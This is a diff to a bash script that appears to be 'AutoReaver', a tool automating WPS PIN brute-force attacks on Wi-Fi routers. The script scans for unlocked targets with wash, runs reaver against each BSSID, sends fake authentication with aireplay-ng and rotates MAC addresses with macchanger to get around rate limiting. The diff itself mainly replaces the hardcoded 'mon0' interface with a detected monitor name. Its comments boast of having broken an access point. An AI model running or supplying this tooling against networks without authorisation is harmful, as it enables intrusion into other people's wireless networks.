@@ -34,7 +34,7 @@
 # You can paste this command into any bash script
 # substr($0, index($0,$6)) is only for handle things like "FRITZ!Box Fon WLAN 7360" which requires to print from 6th do last column :)
 #### PREPARING LIST COMMAND (contained in file: washAutoReaverList)
-# wash -i mon0 -C -s | awk -F' ' '{ if($5 == "No"){print $1 " " $2 " " substr($0, index($0,$6))}}' > myAPTargetsList
+# wash -i ${MONITOR_NAME} -C -s | awk -F' ' '{ if($5 == "No"){print $1 " " $2 " " substr($0, index($0,$6))}}' > myAPTargetsList
 
 ### COMMON KONSOLE ERROR
 # If you see error like:
@@ -58,7 +58,7 @@
 # 6) IMPORTANT THING is to NOT using other scanning software in the same time with reaver, it can slow down the process,
 #    Especially things like wash, nmap, wicd, and other scanners are changing channels during the scan, 
 #    You can however easily check if that's happening - looking at upper right corner of airodump-ng output,
-#    If you see changing values like "Fixed channel mon0: 3,4,10,9 etc." that means something is changing channels of mon0,
+#    If you see changing values like "Fixed channel ${MONITOR_NAME}: 3,4,10,9 etc." that means something is changing channels of ${MONITOR_NAME},
 #    which you should prevent (because your AP is transmitting on one channel)
 ##
 # I have broken one access point with PWR -75 to -80 (airodump-ng)
@@ -67,7 +67,7 @@
 
 #### Helpful commands
 #    sudo iwlist wlan0 scan
-#    wash -i mon0 -C -s
+#    wash -i ${MONITOR_NAME} -C -s
 
 if [[ ! -f $(pwd)"/configurationSettings" ]]; then
     echo "OOOOOPS! You've lost configuration file of AutoReaver: ./configurationSettings";
@@ -140,22 +140,65 @@ touch $CHECK_ACTIVITY_FILE && chmod 600 $CHECK_ACTIVITY_FILE;
 
 #####################################################################################
 ##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
+##### FUNCTIONS #####################################################################
 #####################################################################################
+
+resetWifiCard(){
+  local WIFI_DRIVER=$(getWifiCardDriver);
+  local RESET_CARD_DRIVER_CMD="";
+  if [[ -z "$WIFI_DRIVER" ]]; then
+	echoBlue "Sorry couldn't get your WifiDriver";
+	echoBlue "Check if any wifi card is connected and try again";
+	echoBlue "You may try to reconnect your wifi card to USB port, and try again.";
+	echoBlue "If above solutions doesn't work, you have to check getWifiCardDriver() function on your own...";
+	exit;
+  else 
+	echoBlue "I found that your WIFI driver is $WIFI_DRIVER ";
+	echoBlue "Resetting WIFI card ";
+	echoGreen "modprobe -r $WIFI_DRIVER && modprobe $WIFI_DRIVER";
+	modprobe -r $WIFI_DRIVER && modprobe $WIFI_DRIVER;
+  fi
+}
+
 stopMonitor() {
 	  echoGreen "killall airodump-ng" && killall airodump-ng &>/dev/null;
 	  echoGreen "killall aireplay-ng" && killall aireplay-ng &>/dev/null;
-	  echoGreen "airmon-ng stop mon0" && airmon-ng stop mon0;
-	  echoGreen "airmon-ng stop $WIRELESS_INTERFACE" && airmon-ng stop $WIRELESS_INTERFACE;
-	  echoGreen "airmon-ng check kill" && airmon-ng check kill;
+	  # if monitor was empty tries to get it
+	  if [[ -z "$MONITOR_NAME" ]]; then
+	      MONITOR_NAME=$(getMonitorName);
+	  fi
+	  # if monitor is still empty there's no need to stop it
+	  if [[ ! -z "$MONITOR_NAME" ]]; then
+	      echoGreen "airmon-ng stop $MONITOR_NAME" && airmon-ng stop $MONITOR_NAME;
+	      echoGreen "airmon-ng stop $WIRELESS_INTERFACE" && airmon-ng stop $WIRELESS_INTERFACE;
+	      echoGreen "airmon-ng check" && airmon-ng check;
+	  fi
 }
+
+startMonitor(){
+      echoGreen "airmon-ng start $WIRELESS_INTERFACE" && airmon-ng start $WIRELESS_INTERFACE
+}
+
 restartMonitor() {
       stopMonitor;
-      echoGreen "airmon-ng start $WIRELESS_INTERFACE" && airmon-ng start $WIRELESS_INTERFACE;
+      startMonitor;
 }
+
+# tries to extract monitor name from the ifconfig output
+getMonitorName(){
+    ifconfig | perl -lane '{ if(/^[^\s]*mon/){ $_ =~ s/\s+.*//; print $_; } }'
+}
+
 changeMacTo(){
-      echoGreen "ifconfig mon0 down" && ifconfig mon0 down;
-      echoGreen "macchanger -m $1 mon0" && macchanger -m $1 mon0;
-      echoGreen "ifconfig mon0 up" && ifconfig mon0 up;
+      echoGreen "ifconfig ${MONITOR_NAME} down" && ifconfig ${MONITOR_NAME} down;
+      echoGreen "macchanger -m $1 ${MONITOR_NAME}" && macchanger -m $1 ${MONITOR_NAME};
+      echoGreen "ifconfig ${MONITOR_NAME} up" && ifconfig ${MONITOR_NAME} up;
 }
 
 getRandomMac(){
@@ -288,7 +331,7 @@ echoBlue(){
 # uses globals: TMP_DIR
 isAirodumpWorking(){
   #local CHECK=$(iwlist wlan0 scan | grep "$1");
-  if [[ -z $(ifconfig | grep "mon0") ]]; then
+  if [[ -z $(ifconfig | grep "${MONITOR_NAME}") ]]; then
     restartMonitor &>/dev/null;
   fi
   local TMP_LOG="$TMP_DIR/isAirodumpWorking";
@@ -297,7 +340,7 @@ isAirodumpWorking(){
   local TIMEOUT=15;
   # clear old logs
   rm $AIRODUMP_CSV_LOG &>/dev/null;
-  CM="konsole --background-mode --title 'airodump-ng' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG mon0' ";
+  CM="konsole --background-mode --title 'airodump-ng' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG ${MONITOR_NAME}' ";
   eval $CM 2>/dev/null
   local LAST_PID=$(getNotKonsoleProcessByName 'airodump-ng');
   local CHECK="";
@@ -337,7 +380,7 @@ isAirodumpWorking(){
 # uses globals: BSSID_ONLINE_TIMEOUT, TMP_DIR
 isAPOnline(){
   #local CHECK=$(iwlist wlan0 scan | grep "$1");
-  if [[ -z $(ifconfig | grep "mon0") ]]; then
+  if [[ -z $(ifconfig | grep "${MONITOR_NAME}") ]]; then
     restartMonitor &>/dev/null;
   fi
   local BSSID=$1;
@@ -347,7 +390,7 @@ isAPOnline(){
   local BEGIN_TIME=$(date +%s);
   # clear old logs
   rm $AIRODUMP_CSV_LOG &>/dev/null;
-  CM="konsole --background-mode --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID --channel=$CHANNEL mon0' ";
+  CM="konsole --background-mode --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID --channel=$CHANNEL ${MONITOR_NAME}' ";
   eval $CM 2>/dev/null
   local LAST_PID=$(getNotKonsoleProcessByName 'airodump-ng');
   local CHECK="";
@@ -384,7 +427,7 @@ isAPOnline(){
 
 # uses globals: BSSID_ONLINE_TIMEOUT, TMP_DIR
 findAPChannel(){
-  if [[ -z $(ifconfig | grep "mon0") ]]; then
+  if [[ -z $(ifconfig | grep "${MONITOR_NAME}") ]]; then
     restartMonitor &>/dev/null;
   fi
   local BSSID=$1;
@@ -393,7 +436,7 @@ findAPChannel(){
   local BEGIN_TIME=$(date +%s);
    # clear old logs
   rm $AIRODUMP_CSV_LOG &>/dev/null;
-  CM="konsole --background-mode --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID mon0' ";
+  CM="konsole --background-mode --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --output-format csv --write $TMP_LOG --bssid=$BSSID ${MONITOR_NAME}' ";
   eval $CM 2>/dev/null
   local LAST_PID=$(getNotKonsoleProcessByName 'airodump-ng');
   local CHANNEL="";
@@ -427,7 +470,15 @@ findAPChannel(){
       fi
   done
 }
+
 ########### END OF FUNCTIONS #######################################################
+########### END OF FUNCTIONS #######################################################
+########### END OF FUNCTIONS #######################################################
+########### END OF FUNCTIONS #######################################################
+########### END OF FUNCTIONS #######################################################
+########### END OF FUNCTIONS #######################################################
+
+
 # check logged user
 if [[ $(whoami) != 'root' ]]; then
    echoBlue "You have to be logged as root, otherwise some commands may not work";
@@ -446,8 +497,11 @@ IFS=$'\n';
 # make copy of your list, before proceed (just in case you need it)
 cp "$FILEPATH" "${FILEPATH}_backup";
 
+
+stopMonitor;
 resetWifiCard;
-restartMonitor;
+startMonitor;
+MONITOR_NAME=$(getMonitorName);
 
 
 if [ "$MACCHANGER_ON" == "ONCE" ]; then
@@ -627,17 +681,17 @@ while true; do
       ############# START KONSOLE COMMANDS WITH: REAVER && R.A.C. && AIREPLAY && AIRODUMP
       if [[ $NO_AIRODUMP == 0 ]]; then
 	  # start monitoring BSSID & show blocked WPS in other konsole windows
-	  CM="konsole --background-mode --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --bssid=$BSSID --channel=$CHANNEL mon0' ";
+	  CM="konsole --background-mode --title 'airodump-ng: $BSSID ($ESSID)' -e /bin/sh -c 'airodump-ng --bssid=$BSSID --channel=$CHANNEL ${MONITOR_NAME}' ";
 	  echoGreen "$CM" && eval $CM 2>/dev/null
       fi
       if [[ $NO_AIREPLAY == 0 ]]; then
 	  # sending fake auth every X sec to keep alive connection and better performance of reaver
-	  CM="konsole --background-mode --title 'Fake authorization aireplay-ng' -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $BSSID -c $BSSID mon0' ";
+	  CM="konsole --background-mode --title 'Fake authorization aireplay-ng' -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $BSSID -c $BSSID ${MONITOR_NAME}' ";
 	  echoGreen "$CM" && eval $CM 2>/dev/null
       fi
       # there are only 3 attempts from 1 MAC
       echoBlue "Additional options are: $ADDITIONAL_OPTIONS";
-      COMMAND="reaver -i mon0 -b $BSSID -s $SESSIONFILE --channel=$CHANNEL --mac=$MAC -vv $ADDITIONAL_OPTIONS";
+      COMMAND="reaver -i ${MONITOR_NAME} -b $BSSID -s $SESSIONFILE --channel=$CHANNEL --mac=$MAC -vv $ADDITIONAL_OPTIONS";
       # output of reaver is piped to perl which checks if 'AP rate limiting' is printed by reaver, and reacts creating temporary file indicating that WPS is blocked
       # and kills reaver process so loop can continue
       echoGreen "$COMMAND" && eval $COMMAND \
